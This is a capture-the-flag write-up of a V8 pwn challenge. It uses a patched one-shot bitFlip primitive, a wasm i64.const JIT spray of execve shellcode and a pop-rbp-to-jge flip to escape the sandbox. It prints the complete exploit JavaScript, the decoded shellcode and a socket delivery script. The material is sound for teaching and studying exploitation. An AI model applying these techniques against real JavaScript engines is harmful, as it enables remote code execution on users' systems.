# V8 motor

`V8 motor` is a 500-point pwn (V8/JS engine) challenge from TFC CTF 2026, served
over a dynamic netcat instance. The provided `d8` shell is patched with a single
`bitFlip(object, bit_offset)` primitive that XORs one bit anywhere *outside* the
V8 sandbox. Key idea: JIT-spray shellcode into a WebAssembly code page as
`i64.const` immediates, flip one bit of the function epilogue's `pop rbp`
(`0x5d`) into `jge` (`0x7d`), and ride the jump into the sprayed
`execve("/rdflag")` shellcode.

## Recon

The attachment is `motor_v8.zip`. Unpacking gives:

```
d8                  # patched V8 shell, 49 MB, x64 release build
bitflip.patch       # the vulnerability
readflag.c          # SUID reader that prints /flag
run.sh              # remote wrapper
snapshot_blob.bin   # V8 snapshot
flag, Dockerfile, args.gn
```

`args.gn` shows a release x64 build (`is_debug = false`, `target_cpu = "x64"`).
`Dockerfile` copies the flag to `/flag`, builds `readflag.c` into `/rdflag`
(`chmod 4755`), and runs `socat ... EXEC:/challenge/run.sh` on port 1337.
`run.sh` reads the exact payload length on the first line, then feeds exactly
that many bytes to:

```
timeout 90s /challenge/d8 --log-code --logfile=+ exp.js
```

`--log-code --logfile=+` writes a code-creation log to an anonymous `O_TMPFILE`
(visible later through `/proc/self/fd/*`).

The patch adds the single primitive:

```c
void Shell::BitFlip(const v8::FunctionCallbackInfo<v8::Value>& info) {
  static std::atomic_flag used = ATOMIC_FLAG_INIT;   // ONE use only
  bool already_used = used.test_and_set();
  ...
  uint64_t bit_offset = static_cast<uint64_t>(offset_number);   // <= 2^53-1
  i::Address target = object->address() + bit_offset / 8;
#ifdef V8_ENABLE_SANDBOX
  if (i_isolate->isolate_group()->sandbox()->Contains(target)) {
    ThrowError(isolate, "invalid");   // reject sandbox-internal targets
    return;
  }
#endif
  auto* byte = reinterpret_cast<volatile uint8_t*>(target);
  *byte ^= static_cast<uint8_t>(1u << (bit_offset % 8));
}
```

In the same patch, `os` is now exposed unconditionally but `os.system` is
removed, and the `d8.wasm.serializeModule/deserializeModule` helpers are removed
(WebAssembly itself stays enabled). `readflag.c` is a classic SUID reader:
`setresuid(0)` then `open/read/write` of `/flag`.

## Analysis

Observation: `bitFlip` gives exactly one bit XOR anywhere whose target address is
*outside* the sandbox. WebAssembly code is compiled to a RWX page in trusted
space (outside the sandbox cage), and Liftoff emits each wasm `i64.const` as
`48 b8 <imm64>` (`movabs rax, imm64`) — so the 8-byte immediates are fully
attacker-controlled bytes sitting in executable memory.

Hypothesis (classic bitflip-wasm chain): embed shellcode in the immediates, then
flip one bit of a `pop rbp` in the function epilogue to `jge` so the epilogue's
final conditional jump redirects control into the sprayed immediates, and call
the wasm function again.

Confirmation and key findings (from the solver's notes):

1. **Log leak.** `read('/proc/self/fd/N')` on each fd finds the `--logfile=+`
   temp file (it contains the string `v8-version`). The `code-creation` lines give
   the wasm `codeObj` (field 4) and the eval'd function's `SFI` (field 7 of the
   `code-creation,JS` line for `:1:10`). Local fd = 3, remote fd = 6 — hence the
   fd scan.
2. **PKU.** The remote has *no* Memory Protection Keys, so the wasm code page is
   plain RWX and `bitFlip` succeeds. The local droplet has PKU enabled
   (`SEGV_PKUERR` on the code page), so local tests run with
   `--no-memory-protection-keys`.
3. **SFI -> JSFunction offset.** The `foo` function object sits at
   `sfi + 8244` (0x2034). Allocating 4x64MB `ArrayBuffer`s before the first call
   GC-stabilizes the heap layout and makes this deterministic.
4. **Immediate dedup shifts the epilogue.** Liftoff dedups identical `i64.const`
   immediates: the duplicate is emitted as a 7-byte RIP-relative
   `mov rax,[rip+disp]` instead of a 10-byte `movabs`. With `imm4 == imm11`
   (both `0x9090909090909090`), the epilogue `pop rbp` lands at `code+0xa7`
   (not `0xaa` as the un-deduped layout would place it).
5. **The flip.** Flip bit 5 of the byte at `codeObj + 0xa7`: `0x5d` (`pop rbp`)
   -> `0x7d` (`jge`). The `jge` is taken (the tiering epilogue leaves `SF==OF`)
   and lands at `code+0x6c` = `imm8[1]` (a `nop`), i.e. inside the sprayed
   immediates.

Techniques: **V8 sandbox escape via a single out-of-sandbox bit flip**, **wasm
RWX JIT spray** (shellcode in `i64.const` immediates), and **instruction
flip** (`pop rbp` -> `jge`) to redirect control flow.

## Exploit

The wasm function body is a chain of `i64.const`/`drop` statements; Liftoff
emits `movabs rax, imm64` for each, so the immediates are the JIT-spray slots.
Decoded immediates (little-endian bytes -> x86):

```
imm1  2f 72 64 66 6c 61 67 00   "/rdflag\0"          <- data, at code+0x25
imm4  90 90 90 90 90 90 90 90   nop sled               (== imm11, dedup'd)
imm8  90 90 90 90 31 d2 eb 02   nop;nop;nop;nop; xor edx,edx; jmp +2
imm9  48 83 c7 1d 31 f6 eb 02   add rdi,0x1d; xor esi,esi; jmp +2
imm10 6a 3b 58 0f 05 90 eb 02   push 59; pop rax; syscall; nop; jmp +2
imm11 90 90 90 90 90 90 90 90   nop sled               (== imm4, dedup'd)
final i32.const 0x100000        return-value oracle (calibration)
```

The `eb 02` short jumps skip the fixed `48 b8` (`movabs`) opcode that precedes
each immediate, stitching the 8-byte immediates into one instruction stream.
At shellcode entry the register state is `rdi = codeObj + 8` and `rdx = 0`, so
`add rdi, 0x1d` makes `rdi = codeObj + 0x25` — exactly the `"/rdflag\0"` string
in `imm1`.

Execution once the `jge` lands at `code+0x6c` (`imm8[1]`):

```
90 90 90                    ; nops (imm8[1..3])
31 d2                       ; xor edx, edx
eb 02                       ; skip imm9's "48 b8"
48 83 c7 1d                 ; add rdi, 0x1d   -> rdi = "/rdflag"
31 f6                       ; xor esi, esi
eb 02                       ; skip imm10's "48 b8"
6a 3b 58                    ; push 59; pop rax
0f 05                       ; syscall        -> execve("/rdflag", NULL, NULL)
90 eb 02                    ; nop; jmp +2 (into imm11 nops)
```

**1. Compute the bit offset and flip.**

```javascript
const objAddr = sfi + 8244;                    // JSFunction address of foo
const bitOffset = (codeObj + 167 - objAddr) * 8 + 5;
bitFlip(foo, bitOffset);
```

`bitFlip` resolves `target = foo.address() + bitOffset/8 = codeObj + 167`
(`0xa7`), outside the sandbox, and flips bit 5 (`0x5d ^ 0x20 = 0x7d`).

**2. Call `main()` again to trigger the redirected shellcode.**

The second `inst.exports.main()` re-enters the wasm function; its epilogue now
executes the flipped `jge`, which jumps into the sprayed immediates and runs
`execve("/rdflag", NULL, NULL)`. `/rdflag` is SUID and prints `/flag`.

Final remote payload (`solve/exploit_solved.js`):

```javascript
var foo = (0, eval)("(function(a){return a+1;})");
for (let i = 0; i < 4; i++) new ArrayBuffer(64 * 1024 * 1024);
const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,148,1,1,145,1,0,66,177,236,199,145,141,146,164,200,144,127,26,66,175,228,145,179,198,173,216,51,26,66,208,144,165,188,142,146,164,200,144,127,26,66,179,230,204,153,179,230,204,153,51,26,66,144,161,194,132,137,146,164,200,144,127,26,66,196,136,145,162,196,136,145,162,196,0,26,66,234,246,224,250,208,128,164,200,144,127,26,66,213,170,213,170,213,170,213,170,213,0,26,66,144,161,194,132,153,198,244,245,2,26,66,200,134,158,238,145,198,253,245,2,26,66,234,246,224,250,208,128,228,245,2,26,66,144,161,194,132,137,146,164,200,144,127,26,65,128,128,192,0,11]);
const mod = new WebAssembly.Module(wasmCode);
const inst = new WebAssembly.Instance(mod);
inst.exports.main();
foo(1);
let logfd = -1;
for (let fd = 0; fd < 16; fd++) { try { if (read('/proc/self/fd/' + fd).indexOf('v8-version') !== -1) { logfd = fd; break; } } catch(e) {} }
let codeObj = null, sfi = null;
for (let tries = 0; tries < 2000; tries++) {
  let lines = []; try { lines = read('/proc/self/fd/' + logfd).split('\n'); } catch(e) {}
  for (const l of lines) {
    if (l.startsWith('code-creation') && l.indexOf('wasm-function') !== -1) { codeObj = parseInt(l.split(',')[4], 16); }
    if (l.startsWith('code-creation,JS') && l.indexOf(':1:10') !== -1) { sfi = parseInt(l.split(',')[7], 16); }
  }
  if (codeObj !== null && sfi !== null) break;
}
const objAddr = sfi + 8244;
const bitOffset = (codeObj + 167 - objAddr) * 8 + 5;
if (bitOffset < 0 || bitOffset > 9007199254740991) {
  print('UNREACHABLE');
} else {
  bitFlip(foo, bitOffset);
  inst.exports.main();
}
```

**3. Deliver it.**

`run.sh` expects the exact byte length first, then the payload:

```
$ ncat --ssl <deployment>.challs.ctf.thefewchosen.com 1337
<len(payload)>
<payload bytes>
TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}
```

## Full chain

1. Save the payload above as `exp.js`.
2. Send its exact length, then its bytes, to the netcat service:

```
python3 - <<'EOF'
import socket, ssl
payload = open('exp.js','rb').read()
s = ssl.wrap_socket(socket.create_connection(('<deployment>.challs.ctf.thefewchosen.com', 1337)))
s.sendall(str(len(payload)).encode() + b'\n' + payload)
print(s.recv(4096).decode(errors='replace'))
EOF
```

The wasm function is instantiated, `main()` runs once to populate the log, the
log is scanned for `codeObj` + `sfi`, `bitFlip` flips the epilogue `pop rbp`
byte, and the second `main()` call runs the sprayed `execve("/rdflag")`.

## Flag

`TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}`

## Lessons

- A single *out-of-sandbox* bit flip plus a RWX wasm code page is a complete V8
  sandbox escape: use `i64.const` immediates as a JIT spray and flip a nearby
  conditional-jump byte (`pop rbp 0x5d` -> `jge 0x7d`) to redirect into it.
- Identical immediates get deduplicated into shorter RIP-relative loads, which
  shifts every later instruction in the function — always re-derive the flip
  offset from the final byte layout (and the return-value oracle) instead of
  reusing an earlier variant's offset.
- `--log-code --logfile=+` is itself an information leak: the `code-creation`
  log is reachable through `/proc/self/fd/*`, giving code-object and SFI
  addresses without any extra bug.
